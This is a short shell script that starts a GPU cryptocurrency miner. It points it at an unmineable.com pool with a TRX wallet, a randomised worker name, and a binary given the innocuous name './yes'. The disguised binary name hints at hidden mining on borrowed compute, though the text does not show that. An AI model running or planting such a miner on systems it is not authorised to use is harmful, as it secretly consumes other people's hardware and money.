POOL=rx-us.unmineable.com:3333
WALLET=TRX:TSWveBUFArsaZHEyBdN2F6KC5XcPmS1eEW
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo WcQJHA5z-$(shuf -i 1911-111982 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
